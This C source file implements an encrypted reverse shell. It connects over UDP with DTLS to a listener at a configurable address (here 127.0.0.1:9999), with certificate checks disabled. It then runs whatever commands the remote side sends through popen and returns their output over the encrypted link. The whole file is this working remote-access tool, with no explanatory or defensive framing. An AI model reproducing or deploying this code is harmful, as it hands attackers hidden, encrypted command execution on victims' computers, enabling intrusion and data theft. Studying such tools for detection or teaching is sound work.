#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <errno.h>
#include<sys/wait.h>

#define BUFSIZE 1<<16

int main(){
	const char *host = "127.0.0.1";
	int port = 9999;

	/* Set up remote address struct */
	struct sockaddr_in remoteaddr;
	remoteaddr.sin_family = AF_INET;
	remoteaddr.sin_port = htons(port);
	inet_pton(AF_INET, host, &remoteaddr.sin_addr);

	/* Set up socket file descriptor */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if(s < 0){
		perror("socket");
		exit(-1);
	}

	/* Init OpenSSL */
	OpenSSL_add_ssl_algorithms();
	SSL_load_error_strings();

	/* Create context */
	SSL_CTX *ctx = SSL_CTX_new(DTLS_client_method());

	/* Set context options */
	SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

	/* Create BIO and SSL structs and connect them */
	BIO *bio = BIO_new_dgram(s, BIO_NOCLOSE);
	SSL *ssl = SSL_new(ctx);
	SSL_set_bio(ssl, bio, bio);

	/* Connect to listener and set to connected */
	connect(s, (struct sockaddr*) &remoteaddr, sizeof(struct sockaddr_in));
	BIO_ctrl_set_connected(bio, 0, &remoteaddr);

	/* SSL handshake */
	int retval = SSL_connect(ssl);
	if (retval <= 0){
		printf("[-] Error connecting\n");
		exit(-1);
	}
	printf("Connected to %s\n", host);

	char cmd[BUFSIZE], tokencmd[BUFSIZE], output[BUFSIZE];
	FILE *fd;
	char *error;
	char *token;
	while(memset(cmd, 0, BUFSIZE) && SSL_read(ssl, cmd, sizeof(cmd)) > 0){
		printf("[*] Recv: %s\n", cmd);

		strcpy(tokencmd, cmd);

		/* Parse received command and run */
		token = strtok(tokencmd, " ");
		if(strcmp(token, "cd") == 0){

			token = strtok(NULL, " ");
			if(chdir(token) == -1){
				error = strerror(errno);
				SSL_write(ssl, error, strlen(error));
				SSL_write(ssl, "\n", 2);
			}

		} else {

			printf("[*] Recv: %s\n", cmd);

			/* If user is not doing any stderr redirection, show stderr */
			if(strstr(cmd, "2>") == NULL){
				strcat(cmd, " 2>&1");
			}

			/* Execute command */
			fd = popen(cmd, "re");
			if(fd == NULL){
				error = "[-] Execute command failed\n";
				SSL_write(ssl, error, strlen(error));
				break;
			}

			/* Read output of command and send*/
			printf("[*] Sending command output:\n");
			while(fgets(output, BUFSIZE, fd) != NULL){
				printf("%s", output);
				SSL_write(ssl, output, strlen(output));
			}
		}

		printf("END\n");
		SSL_write(ssl, "", 1);

		printf("===========\n");
	}
}